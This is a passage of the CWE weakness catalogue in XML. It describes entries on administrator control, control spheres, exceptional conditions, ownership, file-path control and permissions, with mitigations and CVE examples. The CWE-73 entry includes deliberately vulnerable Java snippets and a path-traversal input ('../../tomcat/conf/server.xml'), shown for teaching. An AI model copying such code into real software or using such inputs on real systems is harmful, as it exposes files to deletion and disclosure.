               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
            <Introduction>
               <Phase>Operation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Impact>Read Application Data</Impact>
               <Impact>Modify Application Data</Impact>
               <Impact>Unexpected State</Impact>
            </Consequence>
         </Common_Consequences>
         
      </Weakness>
      <Weakness ID="671" Name="Lack of Administrator Control over Security" Abstraction="Class" Structure="Simple" Status="Draft">
         <Description>The product uses security features in a way that prevents the product's administrator from tailoring security settings to reflect the environment in which the product is being used. This introduces resultant weaknesses or prevents it from operating at a level of security that is desired by the administrator.</Description>
         <Extended_Description>If the product's administrator does not have the ability to manage security-related decisions at all times, then protecting the product from outside threats - including the product's developer - can become impossible. For example, a hard-coded account name and password cannot be changed by the administrator, thus exposing that product to attacks that the administrator can not prevent.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="657" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="657" View_ID="699" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.</Note>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Other</Scope>
               <Impact>Varies by Context</Impact>
            </Consequence>
         </Common_Consequences>
         
      </Weakness>
      <Weakness ID="673" Name="External Influence of Sphere Definition" Abstraction="Class" Structure="Simple" Status="Draft">
         <Description>The product does not prevent the definition of control spheres from external actors.</Description>
         <Extended_Description>Typically, a product defines its control sphere within the code itself, or through configuration by the product's administrator. In some cases, an external party can change the definition of the control sphere. This is typically a resultant weakness.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="664" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Other</Scope>
               <Impact>Other</Impact>
            </Consequence>
         </Common_Consequences>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>Consider a blog publishing tool, which might have three explicit control spheres: the creation of articles, only accessible to a "publisher;" commenting on articles, only accessible to a "commenter" who is a registered user; and reading articles, only accessible to an anonymous reader. Suppose that the application is deployed on a web server that is shared with untrusted parties. If a local user can modify the data files that define who a publisher is, then this user has modified the control sphere. In this case, the issue would be resultant from another weakness such as insufficient permissions.</Intro_Text>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>In Untrusted Search Path (CWE-426), a user might be able to define the PATH environment variable to cause the product to search in the wrong directory for a library to load. The product's intended sphere of control would include "resources that are only modifiable by the person who installed the product." The PATH effectively changes the definition of this sphere so that it overlaps the attacker's sphere of control.</Intro_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Notes>
            <Note Type="Theoretical">A "control sphere" is a set of resources and behaviors that are accessible to a single actor, or a group of actors. A product's security model will typically define multiple spheres, possibly implicitly. For example, a server might define one sphere for "administrators" who can create new user accounts with subdirectories under /home/server/, and a second sphere might cover the set of users who can create or delete files within their own subdirectories. A third sphere might be "users who are authenticated to the operating system on which the product is installed." Each sphere has different sets of actors and allowable behaviors.</Note>
         </Notes>
         
      </Weakness>
      <Weakness ID="703" Name="Improper Check or Handling of Exceptional Conditions" Abstraction="Class" Structure="Simple" Status="Incomplete">
         <Description>The software does not properly anticipate or handle exceptional conditions that rarely occur during normal operation of the software.</Description>
         <Applicable_Platforms>
            <Language Class="Language-Independent" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
            <Introduction>
               <Phase>Operation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Availability</Scope>
               <Scope>Integrity</Scope>
               <Impact>Read Application Data</Impact>
               <Impact>DoS: Crash, Exit, or Restart</Impact>
               <Impact>Unexpected State</Impact>
            </Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method>
               <Method>Dynamic Analysis with Manual Results Interpretation</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Fault Injection - source code</xhtml:li>
                           <xhtml:li>Fault Injection - binary</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Forced Path Execution</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Manual Source Code Review (not inspections)</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Focused Manual Spotcheck - Focused manual analysis of source</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Source code Weakness Analyzer</xhtml:li>
                           <xhtml:li>Context-configured Source Code Weakness Analyzer</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Architecture or Design Review</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)</xhtml:li>
                           <xhtml:li>Formal Methods / Correct-By-Construction</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
         </Detection_Methods>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="The CERT Oracle Secure Coding Standard for Java (2011)">
               <Entry_ID>ERR06-J</Entry_ID>
               <Entry_Name>Do not throw undeclared checked exceptions</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <References>
            <Reference External_Reference_ID="REF-567"/>
            <Reference External_Reference_ID="REF-568"/>
            <Reference External_Reference_ID="REF-44" Section="&#34;Sin 8: C++ Catastrophes.&#34; Page 143"/>
         </References>
         <Notes>
            <Note Type="Relationship">This is a high-level class that might have some overlap with other classes. It could be argued that even "normal" weaknesses such as buffer overflows involve unusual or exceptional conditions. In that sense, this might be an inherent aspect of most other weaknesses within CWE, similar to API Abuse (CWE-227) and Indicator of Poor Code Quality (CWE-398). However, this entry is currently intended to unify disparate concepts that do not have other places within the Research Concepts view (CWE-1000).</Note>
         </Notes>
         
      </Weakness>
      <Weakness ID="707" Name="Improper Enforcement of Message or Data Structure" Abstraction="Class" Structure="Simple" Status="Incomplete">
         <Description>The software does not enforce or incorrectly enforces that structured messages or data are well-formed before being read from an upstream component or sent to a downstream component.</Description>
         <Extended_Description>
            <xhtml:p>If a message is malformed it may cause the message to be incorrectly interpreted.</xhtml:p>
            <xhtml:p>This weakness typically applies in cases where the product prepares a control message that another process must act on, such as a command or query, and malicious input that was intended as data, can enter the control plane instead. However, this weakness also applies to more general cases where there are not always control implications.</xhtml:p>
         </Extended_Description>
         <Applicable_Platforms>
            <Language Class="Language-Independent" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Other</Scope>
               <Impact>Other</Impact>
            </Consequence>
         </Common_Consequences>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="250"/>
            <Related_Attack_Pattern CAPEC_ID="276"/>
            <Related_Attack_Pattern CAPEC_ID="277"/>
            <Related_Attack_Pattern CAPEC_ID="278"/>
            <Related_Attack_Pattern CAPEC_ID="279"/>
            <Related_Attack_Pattern CAPEC_ID="3"/>
            <Related_Attack_Pattern CAPEC_ID="33"/>
            <Related_Attack_Pattern CAPEC_ID="34"/>
            <Related_Attack_Pattern CAPEC_ID="43"/>
            <Related_Attack_Pattern CAPEC_ID="468"/>
            <Related_Attack_Pattern CAPEC_ID="52"/>
            <Related_Attack_Pattern CAPEC_ID="53"/>
            <Related_Attack_Pattern CAPEC_ID="64"/>
            <Related_Attack_Pattern CAPEC_ID="66"/>
            <Related_Attack_Pattern CAPEC_ID="7"/>
            <Related_Attack_Pattern CAPEC_ID="78"/>
            <Related_Attack_Pattern CAPEC_ID="79"/>
            <Related_Attack_Pattern CAPEC_ID="83"/>
            <Related_Attack_Pattern CAPEC_ID="84"/>
         </Related_Attack_Patterns>
         
      </Weakness>
      <Weakness ID="708" Name="Incorrect Ownership Assignment" Abstraction="Base" Structure="Simple" Status="Incomplete">
         <Description>The software assigns an owner to a resource, but the owner is outside of the intended control sphere.</Description>
         <Extended_Description>This may allow the resource to be manipulated by actors outside of the intended control sphere.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="282" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="282" View_ID="699" Ordinal="Primary"/>
            <Related_Weakness Nature="CanAlsoBe" CWE_ID="345" View_ID="1000"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Language-Independent" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
            <Introduction>
               <Phase>Operation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Impact>Read Application Data</Impact>
               <Impact>Modify Application Data</Impact>
               <Note>An attacker could read and modify data for which they do not have permissions to access directly.</Note>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Policy</Phase>
               <Description>Periodically review the privileges and their owners.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Testing</Phase>
               <Description>Use automated tools to check for privilege settings.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2007-5101</Reference>
               <Description>File system sets wrong ownership and group when creating a new file.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-5101</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2007-4238</Reference>
               <Description>OS installs program with bin owner/group, allowing modification.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-4238</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2007-1716</Reference>
               <Description>Manager does not properly restore ownership of a reusable resource when a user logs out, allowing privilege escalation.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-1716</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-3148</Reference>
               <Description>Backup software restores symbolic links with incorrect uid/gid.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-3148</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-1064</Reference>
               <Description>Product changes the ownership of files that a symlink points to, instead of the symlink itself.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-1064</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2011-1551</Reference>
               <Description>Component assigns ownership of sensitive directory tree to a user account, which can be leveraged to perform privileged operations.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-1551</Link>
            </Observed_Example>
         </Observed_Examples>
         <Notes>
            <Note Type="Maintenance">
               <xhtml:p>This overlaps verification errors, permissions, and privileges.</xhtml:p>
               <xhtml:p>A closely related weakness is the incorrect assignment of groups to a resource. It is not clear whether it would fall under this entry or require a different entry.</xhtml:p>
            </Note>
         </Notes>
         
      </Weakness>
      <Weakness ID="73" Name="External Control of File Name or Path" Abstraction="Class" Structure="Simple" Status="Draft">
         <Description>The software allows user input to control or influence paths or file names that are used in filesystem operations.</Description>
         <Extended_Description>
            <xhtml:p>This could allow an attacker to access or modify system files or other files that are critical to the application.</xhtml:p>
            <xhtml:p>Path manipulation errors occur when the following two conditions are met:</xhtml:p>
            <xhtml:div style="margin-left:10px;">
               <xhtml:div>1. An attacker can specify a path used in an operation on the filesystem.</xhtml:div>
               <xhtml:div>2. By specifying the resource, the attacker gains a capability that would not otherwise be permitted.</xhtml:div>
            </xhtml:div>
            <xhtml:p>For example, the program may give the attacker the ability to overwrite the specified file or run with a configuration controlled by the attacker.</xhtml:p>
         </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="642" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="610" View_ID="1000"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="20" View_ID="700" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="20" View_ID="699" Ordinal="Primary"/>
            <Related_Weakness Nature="CanPrecede" CWE_ID="22" View_ID="1000"/>
            <Related_Weakness Nature="CanPrecede" CWE_ID="41" View_ID="1000"/>
            <Related_Weakness Nature="CanPrecede" CWE_ID="98" View_ID="1000"/>
            <Related_Weakness Nature="CanPrecede" CWE_ID="434" View_ID="1000"/>
            <Related_Weakness Nature="CanPrecede" CWE_ID="59" View_ID="1000"/>
         </Related_Weaknesses>
         <Weakness_Ordinalities>
            <Weakness_Ordinality>
               <Ordinality>Primary</Ordinality>
            </Weakness_Ordinality>
         </Weakness_Ordinalities>
         <Applicable_Platforms>
            <Language Class="Language-Independent" Prevalence="Undetermined"/>
            <Operating_System Class="Unix" Prevalence="Often"/>
            <Operating_System Class="Windows" Prevalence="Often"/>
            <Operating_System Class="macOS" Prevalence="Often"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
            <Introduction>
               <Phase>Operation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>High</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Integrity</Scope>
               <Scope>Confidentiality</Scope>
               <Impact>Read Files or Directories</Impact>
               <Impact>Modify Files or Directories</Impact>
               <Note>The application can operate on unexpected files. Confidentiality is violated when the targeted filename is not directly readable by the attacker.</Note>
            </Consequence>
            <Consequence>
               <Scope>Integrity</Scope>
               <Scope>Confidentiality</Scope>
               <Scope>Availability</Scope>
               <Impact>Modify Files or Directories</Impact>
               <Impact>Execute Unauthorized Code or Commands</Impact>
               <Note>The application can operate on unexpected files. This may violate integrity if the filename is written to, or if the filename is for a program or other form of executable code.</Note>
            </Consequence>
            <Consequence>
               <Scope>Availability</Scope>
               <Impact>DoS: Crash, Exit, or Restart</Impact>
               <Impact>DoS: Resource Consumption (Other)</Impact>
               <Note>The application can operate on unexpected files. Availability can be violated if the attacker specifies an unexpected file that the application modifies. Availability can also be affected if the attacker specifies a filename for a large file, or points to a special device or a file that does not have the format that the application expects.</Note>
            </Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method>
               <Method>Automated Static Analysis</Method>
               <Description>
                  <xhtml:p>The external control or influence of filenames can often be detected using automated static analysis that models data flow within the software.</xhtml:p>
                  <xhtml:p>Automated static analysis might not be able to recognize when proper input validation is being performed, leading to false positives - i.e., warnings that do not have any security consequences or require any code changes.</xhtml:p>
               </Description>
            </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>When the set of filenames is limited or known, create a mapping from a set of fixed input values (such as numeric IDs) to the actual filenames, and reject all other inputs. For example, ID 1 could map to "inbox.txt" and ID 2 could map to "profile.txt". Features such as the ESAPI AccessReferenceMap provide this capability.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Phase>Operation</Phase>
               <Description>
                  <xhtml:p>Run your code in a "jail" or similar sandbox environment that enforces strict boundaries between the process and the operating system. This may effectively restrict all access to files within a particular directory.</xhtml:p>
                  <xhtml:p>Examples include the Unix chroot jail and AppArmor. In general, managed code may provide some protection.</xhtml:p>
                  <xhtml:p>This may not be a feasible solution, and it only limits the impact to the operating system; the rest of your application may still be subject to compromise.</xhtml:p>
                  <xhtml:p>Be careful to avoid CWE-243 and other weaknesses related to jails.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-5.1">
               <Phase>Implementation</Phase>
               <Strategy>Input Validation</Strategy>
               <Description>
                  <xhtml:p>Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.</xhtml:p>
                  <xhtml:p>When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."</xhtml:p>
                  <xhtml:p>Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.</xhtml:p>
                  <xhtml:p>When validating filenames, use stringent whitelists that limit the character set to be used. If feasible, only allow a single "." character in the filename to avoid weaknesses such as CWE-23, and exclude directory separators such as "/" to avoid CWE-36. Use a whitelist of allowable file extensions, which will help to avoid CWE-434.</xhtml:p>
                  <xhtml:p>Do not rely exclusively on a filtering mechanism that removes potentially dangerous characters. This is equivalent to a blacklist, which may be incomplete (CWE-184). For example, filtering "/" is insufficient protection if the filesystem also supports the use of "\" as a directory separator. Another possible error could occur when the filtering is applied in a way that still produces dangerous data (CWE-182). For example, if "../" sequences are removed from the ".../...//" string in a sequential fashion, two instances of "../" would be removed from the original string, but the remaining characters would still form the "../" string.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>Use a built-in path canonicalization function (such as realpath() in C) that produces the canonical version of the pathname, which effectively removes ".." sequences and symbolic links (CWE-23, CWE-59).</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Installation</Phase>
               <Phase>Operation</Phase>
               <Description>Use OS-level permissions and run as a low-privileged user to limit the scope of any successful attack.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Operation</Phase>
               <Phase>Implementation</Phase>
               <Description>If you are using PHP, configure your application so that it does not use register_globals. During implementation, develop your application so that it does not rely on this feature, but be wary of implementing a register_globals emulation that is subject to weaknesses such as CWE-95, CWE-621, and similar issues.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Testing</Phase>
               <Description>Use automated static analysis tools that target this type of weakness. Many modern techniques use data flow analysis to minimize the number of false positives. This is not a perfect solution, since 100% accuracy and coverage are not feasible.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Testing</Phase>
               <Description>Use dynamic tools and techniques that interact with the software using large test suites with many diverse inputs, such as fuzz testing (fuzzing), robustness testing, and fault injection. The software's operation may slow down, but it should not become unstable, crash, or generate incorrect results.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Testing</Phase>
               <Description>Use tools and techniques that require manual (human) analysis, such as penetration testing, threat modeling, and interactive tools that allow the tester to record and modify an active session. These may be more effective than strictly automated techniques. This is especially the case with weaknesses that are related to design and business rules.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-65">
               <Intro_Text>The following code uses input from an HTTP request to create a file name. The programmer has not considered the possibility that an attacker could provide a file name such as "../../tomcat/conf/server.xml", which causes the application to delete one of its own configuration files (CWE-22).</Intro_Text>
               <Example_Code Nature="bad" Language="Java">
                  <xhtml:div>String rName = request.getParameter("reportName");<xhtml:br/>File rFile = new File("/usr/local/apfr/reports/" + rName);<xhtml:br/>...<xhtml:br/>rFile.delete();</xhtml:div>
               </Example_Code>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-66">
               <Intro_Text>The following code uses input from a configuration file to determine which file to open and echo back to the user. If the program runs with privileges and malicious users can change the configuration file, they can use the program to read any file on the system that ends with the extension .txt.</Intro_Text>
               <Example_Code Nature="bad" Language="Java">
                  <xhtml:div>fis = new FileInputStream(cfg.getProperty("sub")+".txt");<xhtml:br/>amt = fis.read(arr);<xhtml:br/>out.println(arr);</xhtml:div>
               </Example_Code>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2008-5748</Reference>
               <Description>Chain: external control of values for user's desired language and theme enables path traversal.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-5748</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-5764</Reference>
               <Description>Chain: external control of user's target language enables remote file inclusion.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-5764</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="7 Pernicious Kingdoms">
               <Entry_Name>Path Manipulation</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <Entry_ID>SFP16</Entry_ID>
               <Entry_Name>Path Traversal</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="13"/>
            <Related_Attack_Pattern CAPEC_ID="267"/>
            <Related_Attack_Pattern CAPEC_ID="64"/>
            <Related_Attack_Pattern CAPEC_ID="72"/>
            <Related_Attack_Pattern CAPEC_ID="76"/>
            <Related_Attack_Pattern CAPEC_ID="78"/>
            <Related_Attack_Pattern CAPEC_ID="79"/>
            <Related_Attack_Pattern CAPEC_ID="80"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-45"/>
         </References>
         <Notes>
            <Note Type="Relationship">
               <xhtml:p>The external control of filenames can be the primary link in chains with other file-related weaknesses, as seen in the CanPrecede relationships. This is because software systems use files for many different purposes: to execute programs, load code libraries, to store application data, to store configuration settings, record temporary data, act as signals or semaphores to other processes, etc.</xhtml:p>
               <xhtml:p>However, those weaknesses do not always require external control. For example, link-following weaknesses (CWE-59) often involve pathnames that are not controllable by the attacker at all.</xhtml:p>
               <xhtml:p>The external control can be resultant from other issues. For example, in PHP applications, the register_globals setting can allow an attacker to modify variables that the programmer thought were immutable, enabling file inclusion (CWE-98) and path traversal (CWE-22). Operating with excessive privileges (CWE-250) might allow an attacker to specify an input filename that is not directly readable by the attacker, but is accessible to the privileged program. A buffer overflow (CWE-119) might give an attacker control over nearby memory locations that are related to pathnames, but were not directly modifiable by the attacker.</xhtml:p>
            </Note>
         </Notes>
         
      </Weakness>
      <Weakness ID="732" Name="Incorrect Permission Assignment for Critical Resource" Abstraction="Class" Structure="Simple" Status="Draft">
         <Description>The software specifies permissions for a security-critical resource in a way that allows that resource to be read or modified by unintended actors.</Description>
         <Extended_Description>When a resource is given a permissions setting that provides access to a wider range of actors than required, it could lead to the exposure of sensitive information, or the modification of that resource by unintended parties. This is especially dangerous when the resource is related to program configuration, execution or sensitive user data.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="285" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="668" View_ID="1000"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Language-Independent" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>
                  <xhtml:p>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</xhtml:p>
                  <xhtml:p>The developer might make certain assumptions about the environment in which the software runs - e.g., that the software is running on a single-user system, or the software is only accessible to trusted administrators. When the software is running in a different environment, the permissions become a problem.</xhtml:p>
               </Note>
            </Introduction>
            <Introduction>
               <Phase>Installation</Phase>
               <Note>The developer may set loose permissions in order to minimize problems when the user first runs the program, then create documentation stating that permissions should be tightened. Since system administrators and users do not always read the documentation, this can result in insecure permissions being left unchanged.</Note>
            </Introduction>
            <Introduction>
               <Phase>Operation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>High</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Application Data</Impact>
               <Impact>Read Files or Directories</Impact>
               <Note>An attacker may be able to read sensitive information from the associated resource, such as credentials or configuration information stored in a file.</Note>
            </Consequence>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Gain Privileges or Assume Identity</Impact>
               <Note>An attacker may be able to modify critical properties of the associated resource to gain privileges, such as replacing a world-writable executable with a Trojan horse.</Note>
            </Consequence>
            <Consequence>
               <Scope>Integrity</Scope>
               <Scope>Other</Scope>
               <Impact>Modify Application Data</Impact>
               <Impact>Other</Impact>
               <Note>An attacker may be able to destroy or corrupt critical data in the associated resource, such as deletion of records from a database.</Note>
            </Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method>
               <Method>Automated Static Analysis</Method>
               <Description>
                  <xhtml:p>Automated static analysis may be effective in detecting permission problems for system resources such as files, directories, shared memory, device interfaces, etc. Automated techniques may be able to detect the use of library functions that modify permissions, then analyze function calls for arguments that contain potentially insecure values.</xhtml:p>
                  <xhtml:p>However, since the software's intended security policy might allow loose permissions for certain operations (such as publishing a file on a web server), automated static analysis may produce some false positives - i.e., warnings that do not have any security consequences or require any code changes.</xhtml:p>
                  <xhtml:p>When custom permissions models are used - such as defining who can read messages in a particular forum in a bulletin board system - these can be difficult to detect using automated static analysis. It may be possible to define custom signatures that identify any custom functions that implement the permission checks and assignments.</xhtml:p>
               </Description>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Dynamic Analysis</Method>
               <Description>
                  <xhtml:p>Automated dynamic analysis may be effective in detecting permission problems for system resources such as files, directories, shared memory, device interfaces, etc.</xhtml:p>
                  <xhtml:p>However, since the software's intended security policy might allow loose permissions for certain operations (such as publishing a file on a web server), automated dynamic analysis may produce some false positives - i.e., warnings that do not have any security consequences or require any code changes.</xhtml:p>
                  <xhtml:p>When custom permissions models are used - such as defining who can read messages in a particular forum in a bulletin board system - these can be difficult to detect using automated dynamic analysis. It may be possible to define custom signatures that identify any custom functions that implement the permission checks and assignments.</xhtml:p>
               </Description>
            </Detection_Method>
            <Detection_Method Detection_Method_ID="DM-7">
               <Method>Manual Analysis</Method>
               <Description>This weakness can be detected using tools and techniques that require manual (human) analysis, such as penetration testing, threat modeling, and interactive tools that allow the tester to record and modify an active session.</Description>
